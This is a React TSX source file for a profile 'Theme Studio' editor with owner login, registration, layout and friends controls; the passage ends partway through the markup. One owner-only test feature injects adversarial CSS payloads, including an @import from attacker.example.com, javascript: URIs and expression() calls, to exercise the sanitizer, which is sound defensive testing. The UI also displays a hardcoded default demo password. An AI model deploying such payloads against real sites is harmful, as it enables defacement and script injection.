'use client';

import React, { useState, useEffect, useTransition } from 'react';
import {
  UserProfile,
  ProfileDesignTokens,
  LayoutBlock,
  SanitizedCssResult,
  FriendConnection
} from '@/lib/types';
import { THEME_PRESETS } from '@/lib/presets';
import { sanitizeAndScopeCss } from '@/lib/sanitize-css';
import { SandboxedFrame } from './SandboxedFrame';
import { ShadowDomSandbox } from './ShadowDomSandbox';
import {
  Palette,
  Layout,
  Code2,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Save,
  Check,
  AlertTriangle,
  RotateCcw,
  Sparkles,
  Layers,
  Sliders,
  Type,
  Square,
  Eye,
  Zap,
  ArrowUp,
  ArrowDown,
  Columns,
  User,
  Music,
  Lock,
  Unlock,
  LogIn,
  LogOut,
  KeyRound,
  X,
  Loader2,
  UserPlus,
  ArrowRight,
  Users,
  Trash2,
  Plus
} from 'lucide-react';

interface ThemeEditorProps {
  initialProfile: UserProfile;
  isClaimingNew?: boolean;
}

export function ThemeEditor({ initialProfile, isClaimingNew }: ThemeEditorProps) {
  const [profile, setProfile] = useState<UserProfile>(initialProfile);
  const [activeTab, setActiveTab] = useState<'profile' | 'tokens' | 'layout' | 'css' | 'friends'>('profile');
  const [sandboxMode, setSandboxMode] = useState<'iframe' | 'shadow'>('iframe');
  const [viewport, setViewport] = useState<'desktop' | 'tablet' | 'mobile'>('desktop');

  // Real-time CSS AST sanitization state
  const [cssAudit, setCssAudit] = useState<SanitizedCssResult>(() =>
    sanitizeAndScopeCss(initialProfile.rawCss || '')
  );

  const [isSaving, setIsSaving] = useState(false);
  const [saveSuccess, setSaveSuccess] = useState(false);
  const [showTransformedCss, setShowTransformedCss] = useState(false);
  const [, startTransition] = useTransition();

  // Authentication & Ownership State
  const [currentUser, setCurrentUser] = useState<string | null>(null);
  const [isCheckingAuth, setIsCheckingAuth] = useState(true);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [loginPassword, setLoginPassword] = useState('');
  const [loginError, setLoginError] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [newPassword, setNewPassword] = useState('');
  const [passwordChangeSuccess, setPasswordChangeSuccess] = useState(false);

  // Gate view mode & registration state
  const [gateMode, setGateMode] = useState<'login' | 'register'>(
    isClaimingNew ? 'register' : 'login'
  );
  const [regHandle, setRegHandle] = useState('');
  const [regDisplayName, setRegDisplayName] = useState('');
  const [regPassword, setRegPassword] = useState('');
  const [regError, setRegError] = useState('');
  const [isRegistering, setIsRegistering] = useState(false);
  const [regAvailability, setRegAvailability] = useState<{
    checking: boolean;
    available?: boolean;
    reason?: string;
  }>({ checking: false });

  useEffect(() => {
    const trimmed = regHandle.toLowerCase().trim();
    if (!trimmed) {
      setRegAvailability({ checking: false });
      return;
    }
    if (trimmed.length < 3) {
      setRegAvailability({
        checking: false,
        available: false,
        reason: 'At least 3 characters required.'
      });
      return;
    }
    const timer = setTimeout(() => {
      setRegAvailability({ checking: true });
      fetch(`/api/auth/check-username?username=${encodeURIComponent(trimmed)}`)
        .then((res) => res.json())
        .then((data) => {
          setRegAvailability({
            checking: false,
            available: !!data.available,
            reason: data.reason
          });
        })
        .catch(() => setRegAvailability({ checking: false }));
    }, 250);
    return () => clearTimeout(timer);
  }, [regHandle]);

  // Determine if the current authenticated user owns this profile
  const isOwner = !!currentUser && currentUser.toLowerCase() === profile.username.toLowerCase();

  // Check auth session
  useEffect(() => {
    fetch('/api/auth/me')
      .then((res) => res.json())
      .then((data) => {
        if (data.authenticated && data.user) {
          setCurrentUser(data.user.username);
        } else {
          setCurrentUser(null);
        }
      })
      .catch(() => setCurrentUser(null))
      .finally(() => setIsCheckingAuth(false));
  }, []);

  const handleLogin = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!loginPassword) return;
    setIsLoggingIn(true);
    setLoginError('');
    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: profile.username,
          password: loginPassword
        })
      });
      const data = await res.json();
      if (res.ok) {
        setCurrentUser(profile.username);
        setShowLoginModal(false);
        setLoginPassword('');
      } else {
        setLoginError(data.error || 'Login failed.');
      }
    } catch {
      setLoginError('Network error logging in.');
    } finally {
      setIsLoggingIn(false);
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!regHandle.trim() || !regPassword.trim()) return;
    setIsRegistering(true);
    setRegError('');
    try {
      const res = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: regHandle.trim().toLowerCase(),
          displayName: regDisplayName.trim() || undefined,
          password: regPassword.trim()
        })
      });
      const data = await res.json();
      if (res.ok) {
        window.location.href = `/editor?user=${data.username}`;
      } else {
        setRegError(data.error || 'Registration failed.');
      }
    } catch {
      setRegError('Network error registering new account.');
    } finally {
      setIsRegistering(false);
    }
  };

  const handleLogout = async () => {
    await fetch('/api/auth/logout', { method: 'POST' });
    setCurrentUser(null);
  };

  // Run real-time AST sanitization whenever rawCss updates
  useEffect(() => {
    const timer = setTimeout(() => {
      const result = sanitizeAndScopeCss(profile.rawCss || '');
      startTransition(() => {
        setCssAudit(result);
      });
    }, 150);

    return () => clearTimeout(timer);
  }, [profile.rawCss]);

  // Save profile to API (authenticated)
  const handleSave = async () => {
    if (!isOwner) {
      setShowLoginModal(true);
      return;
    }

    setIsSaving(true);
    setSaveSuccess(false);
    try {
      const payload: Record<string, unknown> = { ...profile };
      if (newPassword.trim()) {
        payload.newPassword = newPassword.trim();
      }

      const res = await fetch(`/api/profiles/${profile.username}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (res.ok) {
        setSaveSuccess(true);
        if (newPassword.trim()) {
          setPasswordChangeSuccess(true);
          setNewPassword('');
          setTimeout(() => setPasswordChangeSuccess(false), 3000);
        }
        setTimeout(() => setSaveSuccess(false), 2500);
      } else if (res.status === 401) {
        setShowLoginModal(true);
      } else {
        const errData = await res.json();
        alert(errData.error || 'Save failed.');
      }
    } catch (err) {
      console.error('Save failed', err);
    } finally {
      setIsSaving(false);
    }
  };

  // Preset theme application (guarded by ownership)
  const applyPreset = (presetId: string) => {
    if (!isOwner) return;
    const preset = THEME_PRESETS.find((p) => p.id === presetId);
    if (!preset) return;

    setProfile((prev) => ({
      ...prev,
      tokens: { ...preset.tokens },
      rawCss: preset.sampleCss
    }));
  };

  // Adversarial Attack Test injections (guarded by ownership)
  const injectAdversarialAttack = (attackType: string) => {
    if (!isOwner) return;
    let attackSnippet = '';
    switch (attackType) {
      case 'body-hide':
        attackSnippet = `/* ADVERSARIAL ATTACK 1: Attempt to hide the entire page */\nbody {\n  display: none !important;\n}\nhtml {\n  background: black !important;\n}`;
        break;
      case 'fullscreen-overlay':
        attackSnippet = `/* ADVERSARIAL ATTACK 2: Malicious fullscreen hijack overlay */\ndiv.hijack-takeover {\n  position: fixed !important;\n  top: 0 !important;\n  left: 0 !important;\n  width: 100vw !important;\n  height: 100vh !important;\n  background: rgba(220, 38, 38, 0.95) !important;\n  z-index: 999999 !important;\n  color: white !important;\n  padding: 50px;\n}`;
        break;
      case 'malicious-import-js':
        attackSnippet = `/* ADVERSARIAL ATTACK 3: External tracking @import and javascript: URI */\n@import url("https://attacker.example.com/steal-data.css");\n.profile-header {\n  background: url("javascript:alert('XSS_ATTACK')");\n  behavior: url('evil.htc');\n  width: expression(alert(1));\n}`;
        break;
      case 'navbar-nuke':
        attackSnippet = `/* ADVERSARIAL ATTACK 4: Attempt to kill parent platform navigation */\n#platform-navbar, nav, header {\n  display: none !important;\n  visibility: hidden !important;\n  opacity: 0 !important;\n}`;
        break;
      default:
        return;
    }

    setActiveTab('css');
    setProfile((prev) => ({
      ...prev,
      rawCss: attackSnippet + '\n\n' + (prev.rawCss || '')
    }));
  };

  // Token update helper (guarded by ownership)
  const updateToken = <K extends keyof ProfileDesignTokens>(
    key: K,
    val: ProfileDesignTokens[K]
  ) => {
    if (!isOwner) return;
    setProfile((prev) => ({
      ...prev,
      tokens: {
        ...prev.tokens,
        [key]: val
      }
    }));
  };

  // Layout block movement helper (guarded by ownership)
  const moveBlock = (index: number, direction: 'up' | 'down') => {
    if (!isOwner) return;
    const newLayout = [...profile.layout];
    const targetIndex = direction === 'up' ? index - 1 : index + 1;
    if (targetIndex < 0 || targetIndex >= newLayout.length) return;

    const temp = newLayout[index];
    newLayout[index] = newLayout[targetIndex];
    newLayout[targetIndex] = temp;

    // Reassign order
    newLayout.forEach((item, i) => {
      item.order = i + 1;
    });

    setProfile((prev) => ({ ...prev, layout: newLayout }));
  };

  const toggleBlockColumn = (id: string) => {
    if (!isOwner) return;
    setProfile((prev) => ({
      ...prev,
      layout: prev.layout.map((b) =>
        b.id === id ? { ...b, column: b.column === 'left' ? 'right' : 'left' } : b
      )
    }));
  };

  const toggleBlockVisibility = (id: string) => {
    if (!isOwner) return;
    setProfile((prev) => ({
      ...prev,
      layout: prev.layout.map((b) =>
        b.id === id ? { ...b, visible: !b.visible } : b
      )
    }));
  };

  // Top 8 Friends Squad Management Handlers
  const handleUpdateFriend = (idx: number, updates: Partial<FriendConnection>) => {
    if (!isOwner) return;
    setProfile((prev) => {
      const nextFriends = [...(prev.topFriends || [])];
      if (nextFriends[idx]) {
        nextFriends[idx] = { ...nextFriends[idx], ...updates };
      }
      return { ...prev, topFriends: nextFriends };
    });
  };

  const handleMoveFriend = (idx: number, direction: 'up' | 'down') => {
    if (!isOwner) return;
    setProfile((prev) => {
      const list = [...(prev.topFriends || [])];
      const targetIdx = direction === 'up' ? idx - 1 : idx + 1;
      if (targetIdx < 0 || targetIdx >= list.length) return prev;
      const temp = list[idx];
      list[idx] = list[targetIdx];
      list[targetIdx] = temp;
      return { ...prev, topFriends: list };
    });
  };

  const handleDeleteFriend = (idx: number) => {
    if (!isOwner) return;
    setProfile((prev) => ({
      ...prev,
      topFriends: (prev.topFriends || []).filter((_, i) => i !== idx)
    }));
  };

  const handleAddTopFriend = () => {
    if (!isOwner) return;
    setProfile((prev) => {
      const list = [...(prev.topFriends || [])];
      if (list.length >= 8) return prev;
      const newFriend: FriendConnection = {
        id: `f_${Date.now()}`,
        name: 'New Friend',
        avatarUrl: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=200&auto=format&fit=crop&q=80',
        role: 'Friend',
        status: 'online'
      };
      return { ...prev, topFriends: [...list, newFriend] };
    });
  };

  return (
    <div className="flex flex-col h-[calc(100vh-4rem)] bg-slate-950 text-slate-100 overflow-hidden">
      {/* Editor Subheader & Action Toolbar */}
      <div className="flex flex-wrap items-center justify-between gap-3 px-4 py-2.5 bg-slate-900 border-b border-slate-800 z-10 select-none">
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2">
            <Sparkles className="w-4 h-4 text-pink-400" />
            <span className="text-sm font-bold tracking-tight">
              Customizer Studio
            </span>
          </div>

          {isOwner && (
            <div className="hidden lg:flex items-center gap-1.5 ml-2 pl-3 border-l border-slate-700">
              <span className="text-xs text-slate-400 font-medium">Theme Presets:</span>
              {THEME_PRESETS.map((preset) => (
                <button
                  key={preset.id}
                  type="button"
                  onClick={() => applyPreset(preset.id)}
                  className="text-xs px-2.5 py-1 rounded-md bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition-colors cursor-pointer"
                >
                  {preset.name}
                </button>
              ))}
            </div>
          )}
        </div>

        {/* Adversarial Attack & Security Test Tools (Owner Only) */}
        <div className="flex items-center gap-2">
          {/* Quick Adversarial Injection Test */}
          {isOwner && (
            <div className="relative group">
              <button
                type="button"
                className="flex items-center gap-1.5 text-xs font-semibold px-3 py-1.5 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/30 transition-colors cursor-pointer"
              >
                <Zap className="w-3.5 h-3.5 text-red-400 animate-bounce" />
                <span>Test Adversarial CSS</span>
              </button>

              {/* Attack Preset Dropdown */}
              <div className="absolute right-0 top-full mt-1.5 hidden group-hover:block w-72 p-2 bg-slate-900 border border-slate-700 rounded-xl shadow-2xl z-50 text-xs">
                <p className="font-bold text-slate-300 px-2 py-1 border-b border-slate-800 mb-1 flex items-center justify-between">
                  <span>Adversarial Test Vectors</span>
                  <ShieldAlert className="w-3.5 h-3.5 text-red-400" />
                </p>
                <button
                  type="button"
                  onClick={() => injectAdversarialAttack('body-hide')}
                  className="w-full text-left px-2 py-1.5 rounded hover:bg-slate-800 text-slate-200 transition-colors cursor-pointer"
                >
                  <div className="font-semibold text-red-300">1. Body Nuke (&apos;body &#123; display: none !important &#125;&apos;)</div>
                  <div className="text-[10px] text-slate-400">Tests if canvas scoping prevents killing parent UI</div>
                </button>
                <button
                  type="button"
                  onClick={() => injectAdversarialAttack('fullscreen-overlay')}
                  className="w-full text-left px-2 py-1.5 rounded hover:bg-slate-800 text-slate-200 transition-colors cursor-pointer"
                >
                  <div className="font-semibold text-red-300">2. Fullscreen Fixed Red Hijack</div>
                  <div className="text-[10px] text-slate-400">Tests position: fixed neutralization &amp; iframe boundary</div>
                </button>
                <button
                  type="button"
                  onClick={() => injectAdversarialAttack('malicious-import-js')}
                  className="w-full text-left px-2 py-1.5 rounded hover:bg-slate-800 text-slate-200 transition-colors cursor-pointer"
                >
                  <div className="font-semibold text-red-300">3. Malicious @import &amp; javascript: URI</div>
                  <div className="text-[10px] text-slate-400">Tests AST stripping of external leaks &amp; XSS URIs</div>
                </button>
                <button
                  type="button"
                  onClick={() => injectAdversarialAttack('navbar-nuke')}
                  className="w-full text-left px-2 py-1.5 rounded hover:bg-slate-800 text-slate-200 transition-colors cursor-pointer"
                >
                  <div className="font-semibold text-red-300">4. Target Parent Navbar (&apos;#platform-navbar&apos;)</div>
                  <div className="text-[10px] text-slate-400">Tests selector scoping to .profile-canvas container</div>
                </button>
              </div>
            </div>
          )}

          {/* Sandbox Technology Mode Toggle */}
          <div className="flex items-center bg-slate-800 rounded-lg p-0.5 border border-slate-700 text-xs">
            <button
              type="button"
              onClick={() => setSandboxMode('iframe')}
              className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer ${
                sandboxMode === 'iframe'
                  ? 'bg-blue-600 text-white shadow-sm'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Iframe Sandbox
            </button>
            <button
              type="button"
              onClick={() => setSandboxMode('shadow')}
              className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer ${
                sandboxMode === 'shadow'
                  ? 'bg-blue-600 text-white shadow-sm'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Shadow DOM
            </button>
          </div>

          {/* Auth Status & Login Button */}
          {isOwner ? (
            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-xs font-mono">
              <Lock className="w-3.5 h-3.5 text-emerald-400" />
              <span>@{currentUser}</span>
              <button
                type="button"
                onClick={handleLogout}
                title="Log out of this profile"
                className="ml-1 text-slate-400 hover:text-white cursor-pointer"
              >
                <LogOut className="w-3 h-3" />
              </button>
            </div>
          ) : currentUser ? (
            <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-amber-500/10 border border-amber-500/30 text-amber-300 text-xs font-mono">
              <User className="w-3.5 h-3.5 text-amber-400" />
              <span>@{currentUser} (Visitor)</span>
              <button
                type="button"
                onClick={handleLogout}
                title="Log out"
                className="ml-1 text-slate-400 hover:text-white cursor-pointer"
              >
                <LogOut className="w-3 h-3" />
              </button>
            </div>
          ) : (
            <button
              type="button"
              onClick={() => {
                const pwdInput = document.getElementById('gate-password-input');
                if (pwdInput) {
                  pwdInput.focus();
                  setGateMode('login');
                } else {
                  setShowLoginModal(true);
                }
              }}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer"
            >
              <LogIn className="w-3.5 h-3.5" />
              <span>Log In to Edit</span>
            </button>
          )}

          {/* Save Profile or Read-Only Indicator */}
          {isOwner ? (
            <button
              type="button"
              onClick={handleSave}
              disabled={isSaving}
              className="flex items-center gap-1.5 text-xs font-semibold px-4 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white shadow-md transition-all active:scale-95 disabled:opacity-50 cursor-pointer"
            >
              {saveSuccess ? (
                <>
                  <Check className="w-3.5 h-3.5 text-white animate-scale" />
                  <span>Saved!</span>
                </>
              ) : (
                <>
                  <Save className="w-3.5 h-3.5" />
                  <span>{isSaving ? 'Saving...' : 'Save Profile'}</span>
                </>
              )}
            </button>
          ) : (
            <button
              type="button"
              onClick={() => {
                const pwdInput = document.getElementById('gate-password-input');
                if (pwdInput) {
                  pwdInput.focus();
                  setGateMode('login');
                } else {
                  setShowLoginModal(true);
                }
              }}
              className="flex items-center gap-1.5 text-xs font-semibold px-3 py-1.5 rounded-lg bg-slate-800 text-slate-400 hover:text-white border border-slate-700 transition-colors cursor-pointer"
              title="Locked: Authenticate as owner to edit and save"
            >
              <Lock className="w-3.5 h-3.5 text-amber-400" />
              <span>Read-Only Mode</span>
            </button>
          )}
        </div>
      </div>

      {/* Main Split Pane Layout */}
      <div className="flex-1 flex flex-col md:flex-row overflow-hidden">
        {/* LEFT PANE: Customizer Controls OR Owner Authentication Gate (Width: 42%) */}
        <div className="w-full md:w-[45%] lg:w-[42%] flex flex-col border-r border-slate-800 bg-slate-900/80 backdrop-blur overflow-hidden">
          {isCheckingAuth ? (
            <div className="flex-1 flex flex-col items-center justify-center p-8 text-center space-y-3">
              <Loader2 className="w-8 h-8 text-indigo-400 animate-spin" />
              <p className="text-sm font-semibold text-slate-300">Checking studio access...</p>
              <p className="text-xs text-slate-500 font-mono">Verifying @{profile.username} ownership credentials</p>
            </div>
          ) : !isOwner ? (
            /* OWNER AUTHENTICATION GATE */
            <div className="flex-1 flex flex-col overflow-y-auto p-5 sm:p-6 space-y-6">
              {/* Header Badge */}
              <div className="p-5 rounded-2xl bg-gradient-to-b from-slate-800/90 to-slate-900/90 border border-slate-700/80 shadow-xl space-y-4">
                <div className="flex items-start gap-3.5">
                  <div className="w-12 h-12 rounded-xl bg-amber-500/15 border border-amber-500/30 flex items-center justify-center text-amber-400 flex-shrink-0 shadow-inner">
                    <Lock className="w-6 h-6" />
                  </div>
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center gap-2">
                      <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30">
                        Owner Protected
                      </span>
                    </div>
                    <h2 className="text-base font-bold text-white mt-1">
                      Theme Studio is Locked
                    </h2>
                    <p className="text-xs text-slate-400 mt-0.5 leading-relaxed">
                      Only the owner of this profile can modify design tokens, layout blocks, and raw CSS.
                    </p>
                  </div>
                </div>

                {/* Profile Identity Card */}
                <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-950/70 border border-slate-800">
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img
                    src={profile.avatarUrl || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=80'}
                    alt={profile.displayName}
                    className="w-11 h-11 rounded-lg object-cover border border-slate-700 flex-shrink-0"
                  />
                  <div className="min-w-0 flex-1">
                    <div className="text-sm font-bold text-white truncate">
                      {profile.displayName || profile.username}
                    </div>
                    <div className="text-xs font-mono text-cyan-400">
                      @{profile.username}
                    </div>
                  </div>
                  <span className="text-[10px] font-mono px-2 py-1 rounded bg-slate-800 text-slate-300 border border-slate-700">
                    Read-Only
                  </span>
                </div>
              </div>

              {/* Account Mismatch Notice (if logged in as another user) */}
              {currentUser && currentUser.toLowerCase() !== profile.username.toLowerCase() && (
                <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/30 space-y-3">
                  <div className="flex items-center gap-2 text-amber-300 text-xs font-bold">
                    <AlertTriangle className="w-4 h-4 text-amber-400" />
                    <span>Logged In as Different User</span>
                  </div>
                  <p className="text-xs text-slate-300 leading-relaxed">
                    You are signed in as <strong className="text-white font-mono">@{currentUser}</strong>. You do not have permission to modify <strong className="text-white font-mono">@{profile.username}</strong>&apos;s personal space.
                  </p>
                  <div className="flex flex-col sm:flex-row gap-2 pt-1">
                    <a
                      href={`/editor?user=${currentUser}`}
                      className="flex-1 text-center px-3 py-2 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold transition-colors shadow-sm"
                    >
                      Open My Studio (@{currentUser})
                    </a>
                    <button
                      type="button"
                      onClick={handleLogout}
                      className="px-3 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-medium border border-slate-700 transition-colors cursor-pointer"
                    >
                      Log Out
                    </button>
                  </div>
                </div>
              )}

              {/* Mode switcher tabs (Login vs Register) */}
              <div className="flex items-center p-1 rounded-xl bg-slate-950 border border-slate-800 text-xs font-semibold">
                <button
                  type="button"
                  onClick={() => { setGateMode('login'); setLoginError(''); setRegError(''); }}
                  className={`flex-1 py-2 rounded-lg transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                    gateMode === 'login'
                      ? 'bg-indigo-600 text-white shadow-sm'
                      : 'text-slate-400 hover:text-white'
                  }`}
                >
                  <LogIn className="w-3.5 h-3.5" />
                  <span>Log In as @{profile.username}</span>
                </button>
                <button
                  type="button"
                  onClick={() => { setGateMode('register'); setLoginError(''); setRegError(''); }}
                  className={`flex-1 py-2 rounded-lg transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                    gateMode === 'register'
                      ? 'bg-gradient-to-r from-pink-600 to-indigo-600 text-white shadow-sm'
                      : 'text-slate-400 hover:text-white'
                  }`}
                >
                  <UserPlus className="w-3.5 h-3.5" />
                  <span>Claim New Profile</span>
                </button>
              </div>

              {/* LOGIN FORM */}
              {gateMode === 'login' ? (
                <form onSubmit={handleLogin} className="p-5 rounded-2xl bg-slate-800/60 border border-slate-700/80 space-y-4">
                  <div className="space-y-1.5">
                    <label className="text-xs font-semibold text-slate-300 flex items-center justify-between">
                      <span>Password for @{profile.username}</span>
                      <span className="text-[10px] text-slate-400 font-mono">Owner Verification</span>
                    </label>
                    <input
                      id="gate-password-input"
                      type="password"
                      value={loginPassword}
                      onChange={(e) => setLoginPassword(e.target.value)}
                      placeholder="Enter profile password"
                      autoFocus
                      required
                      className="w-full px-3.5 py-2.5 text-sm bg-slate-950 border border-slate-700 rounded-xl text-white font-mono focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all"
                    />
                    {profile.username.toLowerCase() !== 'kevin' && (
                      <div className="flex items-center justify-between pt-1">
                        <p className="text-[11px] text-slate-400">
                          Default demo password: <span className="font-mono text-indigo-300 font-bold">teramee2026</span>
                        </p>
                      </div>
                    )}
                  </div>

                  {loginError && (
                    <div className="p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-300 text-xs flex items-center gap-2">
                      <AlertTriangle className="w-4 h-4 flex-shrink-0 text-rose-400" />
                      <span>{loginError}</span>
                    </div>
                  )}

                  <button
                    type="submit"
                    disabled={isLoggingIn || !loginPassword}
                    className="w-full py-2.5 px-4 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold transition-all shadow-md shadow-indigo-500/25 disabled:opacity-50 flex items-center justify-center gap-2 cursor-pointer"
                  >
                    {isLoggingIn ? (
                      <>
                        <Loader2 className="w-3.5 h-3.5 animate-spin" />
                        <span>Verifying Credentials...</span>
                      </>
                    ) : (
                      <>
                        <Unlock className="w-3.5 h-3.5" />
                        <span>Log In &amp; Unlock Studio</span>
                      </>
                    )}
                  </button>
                </form>
              ) : (
                /* REGISTER NEW SPACE FORM */
                <form onSubmit={handleRegister} className="p-5 rounded-2xl bg-slate-800/60 border border-slate-700/80 space-y-4">
                  <div className="p-3 rounded-xl bg-indigo-950/40 border border-indigo-500/20 text-[11px] text-slate-300 space-y-1 leading-relaxed">
                    <div className="font-bold text-pink-300 flex items-center gap-1.5">
                      <Sparkles className="w-3.5 h-3.5 text-pink-400" />
                      <span>What is Claiming a Handle?</span>
                    </div>
                    <p className="text-slate-400">
                      Claiming reserves your personal <code className="text-cyan-300 font-mono">teramee.com/user/@handle</code> URL and unlocks your own password-protected Theme Studio for custom CSS, music, and Top 8 friends.
                    </p>
                  </div>

                  <div className="space-y-1.5">
                    <div className="flex items-center justify-between">
                      <label className="text-xs font-semibold text-slate-300">Check &amp; Choose Your Handle</label>
                      {regAvailability.checking ? (
                        <span className="text-[10px] font-mono text-blue-400">Checking...</span>
                      ) : regAvailability.available === true ? (
                        <span className="text-[10px] font-mono font-bold text-emerald-400">✓ Available!</span>
                      ) : regAvailability.available === false ? (
                        <span className="text-[10px] font-mono font-bold text-rose-400">✕ Unavailable</span>
                      ) : null}
                    </div>
                    <div className="flex items-center rounded-xl bg-slate-950 border border-slate-700 px-3 py-2 text-sm focus-within:border-pink-500">
                      <span className="text-pink-400 font-mono font-bold mr-1 text-xs">teramee.com/@</span>
                      <input
                        type="text"
                        value={regHandle}
                        onChange={(e) => setRegHandle(e.target.value.toLowerCase().replace(/[^a-z0-9_]/g, ''))}
                        placeholder="yourname"
                        required
                        maxLength={20}
                        className="bg-transparent text-white font-mono focus:outline-none w-full text-xs"
                      />
                    </div>
                    {regAvailability.reason && (
                      <p className={`text-[11px] font-mono ${regAvailability.available ? 'text-emerald-400' : 'text-rose-400'}`}>
                        {regAvailability.reason}
                      </p>
                    )}
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Display Name (Optional)</label>
                    <input
                      type="text"
                      value={regDisplayName}
                      onChange={(e) => setRegDisplayName(e.target.value)}
                      placeholder="e.g. Alex River"
                      className="w-full px-3.5 py-2 text-xs bg-slate-950 border border-slate-700 rounded-xl text-white focus:outline-none focus:border-pink-500"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Create Password</label>
                    <input
                      type="password"
                      value={regPassword}
                      onChange={(e) => setRegPassword(e.target.value)}
                      placeholder="At least 4 characters"
                      required
                      className="w-full px-3.5 py-2 text-xs bg-slate-950 border border-slate-700 rounded-xl text-white font-mono focus:outline-none focus:border-pink-500"
                    />
                  </div>

                  {regError && (
                    <div className="p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-300 text-xs flex items-center gap-2">
                      <AlertTriangle className="w-4 h-4 flex-shrink-0 text-rose-400" />
                      <span>{regError}</span>
                    </div>
                  )}

                  <button
                    type="submit"
                    disabled={isRegistering || !regHandle || !regPassword || regAvailability.available === false}
                    className="w-full py-2.5 px-4 rounded-xl bg-gradient-to-r from-pink-500 to-indigo-600 hover:from-pink-400 hover:to-indigo-500 text-white text-xs font-bold transition-all shadow-md shadow-pink-500/20 disabled:opacity-50 flex items-center justify-center gap-2 cursor-pointer"
                  >
                    {isRegistering ? (
                      <>
                        <Loader2 className="w-3.5 h-3.5 animate-spin" />
                        <span>Creating Profile...</span>
                      </>
                    ) : (
                      <>
                        <Sparkles className="w-3.5 h-3.5" />
                        <span>Reserve Handle &amp; Open Studio</span>
                      </>
                    )}
                  </button>
                </form>
              )}

              {/* Informational Security Card */}
              <div className="p-4 rounded-xl bg-slate-950/50 border border-slate-800 text-[11px] text-slate-400 space-y-1.5 leading-relaxed">
                <div className="flex items-center gap-1.5 font-bold text-slate-300">
                  <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                  <span>Why is this screen locked?</span>
                </div>
                <p>
                  Teramee gives members complete expressive freedom to style their spaces with raw CSS and customized layout blocks. To guarantee authenticity and prevent tampering, editing tools and live adjustments are strictly restricted to the verified account owner.
                </p>
              </div>
            </div>
          ) : (
            <>
              {/* Customizer Tabs Navigation */}
              <div className="flex items-center border-b border-slate-800 bg-slate-900/90 px-3 pt-2 overflow-x-auto">
            <button
              type="button"
              onClick={() => setActiveTab('profile')}
              className={`flex items-center gap-1.5 px-3 py-2.5 text-xs font-semibold rounded-t-lg transition-colors border-t-2 whitespace-nowrap cursor-pointer ${
                activeTab === 'profile'
                  ? 'border-blue-500 bg-slate-800/90 text-white'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
              }`}
            >
              <User className="w-3.5 h-3.5 text-emerald-400" />
              Profile &amp; Avatar
            </button>

            <button
              type="button"
              onClick={() => setActiveTab('tokens')}
              className={`flex items-center gap-1.5 px-3 py-2.5 text-xs font-semibold rounded-t-lg transition-colors border-t-2 whitespace-nowrap cursor-pointer ${
                activeTab === 'tokens'
                  ? 'border-blue-500 bg-slate-800/90 text-white'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
              }`}
            >
              <Palette className="w-3.5 h-3.5 text-blue-400" />
              Tokens
            </button>

            <button
              type="button"
              onClick={() => setActiveTab('layout')}
              className={`flex items-center gap-1.5 px-3 py-2.5 text-xs font-semibold rounded-t-lg transition-colors border-t-2 whitespace-nowrap cursor-pointer ${
                activeTab === 'layout'
                  ? 'border-blue-500 bg-slate-800/90 text-white'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
              }`}
            >
              <Layout className="w-3.5 h-3.5 text-purple-400" />
              Blocks
            </button>

            <button
              type="button"
              onClick={() => setActiveTab('friends')}
              className={`flex items-center gap-1.5 px-3 py-2.5 text-xs font-semibold rounded-t-lg transition-colors border-t-2 whitespace-nowrap cursor-pointer ${
                activeTab === 'friends'
                  ? 'border-blue-500 bg-slate-800/90 text-white'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
              }`}
            >
              <Users className="w-3.5 h-3.5 text-indigo-400" />
              Top 8 Squad
